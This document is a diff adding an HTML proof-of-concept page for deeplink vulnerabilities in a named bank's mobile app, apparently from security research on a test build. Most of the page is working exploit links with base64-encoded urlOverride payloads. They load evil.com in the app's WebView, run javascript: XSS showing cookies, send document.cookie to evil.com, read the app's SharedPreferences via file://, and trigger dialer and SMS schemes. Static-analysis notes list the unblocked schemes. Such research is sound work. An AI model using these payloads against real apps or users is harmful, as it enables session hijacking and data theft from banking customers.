@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <title>CitiVELOCITY — Mobile PoC</title>
+  <style>
+    *{box-sizing:border-box}
+    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;margin:0;padding:0;background:#0a0e14;color:#e6edf3;min-height:100vh}
+    .header{background:#0d1117;border-bottom:1px solid #21262d;padding:16px 20px;position:sticky;top:0;z-index:100}
+    .header h1{font-size:18px;margin:0;color:#f0f6fc}
+    .header p{font-size:12px;margin:4px 0 0;color:#8b949e}
+    .container{padding:16px 20px;max-width:100%}
+    .section{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:16px;margin-bottom:16px}
+    .section-title{font-size:14px;font-weight:600;color:#f0883e;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+    .section-desc{font-size:12px;color:#8b949e;margin-bottom:12px}
+    .badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:10px;font-weight:700;text-transform:uppercase}
+    .badge-crit{background:#da3633;color:#fff}
+    .badge-high{background:#bc4c00;color:#fff}
+    .badge-med{background:#8957e5;color:#fff}
+    .btn{display:block;width:100%;padding:14px 16px;margin:8px 0;border-radius:10px;font-size:14px;font-weight:600;text-align:center;text-decoration:none;border:none;cursor:pointer;transition:transform .1s}
+    .btn:active{transform:scale(.97)}
+    .btn small{display:block;font-weight:400;font-size:11px;margin-top:4px;opacity:.85;word-break:break-all}
+    .btn-primary{background:#1f6feb;color:#fff}
+    .btn-danger{background:#da3633;color:#fff}
+    .btn-warning{background:#bc4c00;color:#fff}
+    .btn-success{background:#238636;color:#fff}
+    .btn-ghost{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
+    .info-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;margin:12px 0;font-size:12px;color:#8b949e}
+    .info-box code{background:#161b22;padding:2px 6px;border-radius:4px;font-family:monospace;color:#f0883e}
+    .divider{height:1px;background:#21262d;margin:16px 0}
+    .result{display:none;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;margin-top:8px;font-size:12px;font-family:monospace;white-space:pre-wrap;color:#3fb950}
+    .result.error{color:#f85149}
+    footer{text-align:center;padding:20px;font-size:11px;color:#484f58}
+    .intent-note{background:#0d1117;border-left:3px solid #f0883e;padding:10px 12px;margin:10px 0;font-size:12px;color:#8b949e}
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>🔴 CitiVELOCITY Mobile PoC</h1>
+    <p>Test deeplink vulnerabilities directly on your phone</p>
+  </div>
+
+  <div class="container">
+
+    <!-- SECTION: Arbitrary HTTPS -->
+    <div class="section">
+      <div class="section-title"><span class="badge badge-crit">Critical</span> Arbitrary HTTPS Host Loading</div>
+      <div class="section-desc">urlOverride accepts any HTTPS host without allowlist validation</div>
+
+      <div class="intent-note">
+        <strong>Intent links</strong> → Open directly in Citi app (no browser chooser)<br>
+        <strong>HTTPS links</strong> → May show chooser, select CitiVELOCITY
+      </div>
+
+      <a class="btn btn-primary" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9aHR0cHM6Ly9keHBvYy5ndC50Yy8/Y29uZlNlc3Npb249MQ==#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        🎯 dxpoc.gt.tc (Intent)
+        <small>Opens directly in Citi app</small>
+      </a>
+
+      <a class="btn btn-ghost" href="https://uat.citivelocity.com/cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9aHR0cHM6Ly9keHBvYy5ndC50Yy8/Y29uZlNlc3Npb249MQ==">
+        🌐 dxpoc.gt.tc (HTTPS)
+        <small>May show app chooser</small>
+      </a>
+
+      <a class="btn btn-danger" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9aHR0cHM6Ly9ldmlsLmNvbS8/Y29uZlNlc3Npb249MQ==#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        ☠️ evil.com (Intent)
+        <small>urlOverride=https://evil.com</small>
+      </a>
+    </div>
+
+    <!-- SECTION: XSS via javascript: -->
+    <div class="section">
+      <div class="section-title"><span class="badge badge-crit">Critical</span> XSS via javascript: scheme</div>
+      <div class="section-desc">WebView only blocks http: — javascript: executes in app context</div>
+
+      <div class="info-box">
+        <strong>Expected:</strong> If Citi WebView loads this, an alert dialog appears <strong>inside the app</strong> with User-Agent or cookies. This proves XSS in authenticated context.
+      </div>
+
+      <a class="btn btn-danger" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9amF2YXNjcmlwdDphbGVydChuYXZpZ2F0b3IudXNlckFnZW50KS8vP2NvbmZTZXNzaW9uPTE=#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        🚨 alert(userAgent) via javascript:
+        <small>javascript:alert(navigator.userAgent)</small>
+      </a>
+
+      <a class="btn btn-danger" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUpLy8/Y29uZlNlc3Npb249MQ==#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        🍪 alert(document.cookie) via javascript:
+        <small>javascript:alert(document.cookie)</small>
+      </a>
+
+      <a class="btn btn-warning" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9amF2YXNjcmlwdDpsb2NhdGlvbi5ocmVmPSdodHRwczovL2V2aWwuY29tLz9jb29raWU9Jytkb2N1bWVudC5jb29raWUvLz9jb25mU2Vzc2lvbj0x#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        📤 Exfiltrate cookies to evil.com
+        <small>Redirects cookies to attacker server</small>
+      </a>
+    </div>
+
+    <!-- SECTION: VBScript -->
+    <div class="section">
+      <div class="section-title"><span class="badge badge-high">High</span> VBScript scheme bypass</div>
+      <div class="section-desc">vbscript: string found in DEX (classes23.dex) — test if WebView accepts it</div>
+
+      <a class="btn btn-warning" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9dmJzY3JpcHQ6bXNnYm94KCJWQlNjcmlwdCB0ZXN0IikvLz9jb25mU2Vzc2lvbj0x#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        📟 vbscript: msgbox test
+        <small>vbscript:msgbox("VBScript test")</small>
+      </a>
+    </div>
+
+    <!-- SECTION: File scheme -->
+    <div class="section">
+      <div class="section-title"><span class="badge badge-high">High</span> Local File Access via file://</div>
+      <div class="section-desc">file: scheme NOT blocked — may read local files</div>
+
+      <a class="btn btn-warning" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9ZmlsZTovLy9zeXN0ZW0vZXRjL2hvc3RzLy8/Y29uZlNlc3Npb249MQ==#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        📁 file:///system/etc/hosts
+        <small>Read local hosts file</small>
+      </a>
+
+      <a class="btn btn-ghost" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9ZmlsZTovLy9kYXRhL2RhdGEvY29tLmNpdGkuaWNnLnBvcnRhbC5tb2JpbGUudWF0L3NoYXJlZF9wcmVmcy9DVlByZWZlcmVuY2VzLnhtbC8vP2NvbmZTZXNzaW9uPTE=#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        🔐 file:///data/data/.../CVPreferences.xml
+        <small>Read app SharedPreferences (if accessible)</small>
+      </a>
+    </div>
+
+    <!-- SECTION: Telecom schemes -->
+    <div class="section">
+      <div class="section-title"><span class="badge badge-med">Medium</span> Telecom Scheme Injection</div>
+      <div class="section-desc">wtai:, ymsgr:, tel:, sms: found in DEX — trigger system apps</div>
+
+      <a class="btn btn-ghost" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9d3RhaTovL3dwL21jOzEyMzQ1Njc4OTAvLz9jb25mU2Vzc2lvbj0x#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        📞 wtai://wp/mc;1234567890
+        <small>Triggers phone dialer</small>
+      </a>
+
+      <a class="btn btn-ghost" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9dGVsOjEyMzQ1Njc4OTAvLz9jb25mU2Vzc2lvbj0x#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        📲 tel:1234567890
+        <small>Triggers phone dialer</small>
+      </a>
+
+      <a class="btn btn-ghost" href="intent://cv2/smartlink/commentary/poc/cv2/smartlink/menu/MARKET_INTELLIGENCE_CONFERENCES_WEBCASTS?U0xfNjQ.dXJsT3ZlcnJpZGU9c21zOjEyMzQ1Njc4OTAvLz9jb25mU2Vzc2lvbj0x#Intent;scheme=https;package=com.citi.icg.portal.mobile.uat;end">
+        💬 sms:1234567890
+        <small>Triggers SMS app</small>
+      </a>
+    </div>
+
+    <!-- SECTION: How to use -->
+    <div class="section">
+      <div class="section-title">📋 How to Test</div>
+      <div class="info-box">
+        <strong>1.</strong> Make sure CitiVELOCITY app is installed and you are logged in<br><br>
+        <strong>2.</strong> Tap any button above<br><br>
+        <strong>3.</strong> For <strong>Intent links</strong>: Should open directly in Citi app<br><br>
+        <strong>4.</strong> For <strong>HTTPS links</strong>: If a chooser appears, select "CitiVELOCITY"<br><br>
+        <strong>5.</strong> <strong>Expected results:</strong><br>
+        &nbsp;&nbsp;• Buttons 1-2: Citi WebView loads external website (no origin indicator)<br>
+        &nbsp;&nbsp;• Buttons 3-5: Alert dialog appears inside Citi app = XSS confirmed<br>
+        &nbsp;&nbsp;• Button 6: VBScript alert (if supported)<br>
+        &nbsp;&nbsp;• Buttons 7-8: Shows local file contents in WebView<br>
+        &nbsp;&nbsp;• Buttons 9-11: Opens phone/SMS app from inside Citi app
+      </div>
+    </div>
+
+    <!-- SECTION: Evidence -->
+    <div class="section">
+      <div class="section-title">🧾 Static Analysis Evidence</div>
+      <div class="info-box" style="font-family:monospace;font-size:11px;overflow-x:auto">
+From classes23.dex:
+  "Block link due to http scheme:"
+  → ONLY http: is blocked!
+
+Schemes found in DEX (NOT blocked):
+  javascript:  ← XSS vector
+  vbscript:    ← Found in classes23.dex
+  file:        ← Local file access
+  content:     ← Content provider access
+  wtai:        ← WTAI dialer
+  ymsgr:       ← Yahoo Messenger
+  tel:         ← Phone dialer
+  sms:         ← SMS app
+  mailto:      ← Email app
+
+From AndroidManifest.xml:
+  android:debuggable="true"
+  android:allowBackup="true"
+  android:usesCleartextTraffic="true"
+
+From classes36.dex:
+  com.facebook.stetho.Stetho
+  com.facebook.stetho.InspectorModulesProvider
+      </div>
+    </div>
+
+    <footer>
+      PoC generated from static analysis of<br>
+      CitiVELOCITY-UAT 3.11.5.1.2025-11-05_16-18.uat-debug.apk<br>
+      For authorized security research only.
+    </footer>
+  </div>
+</body>
+</html>
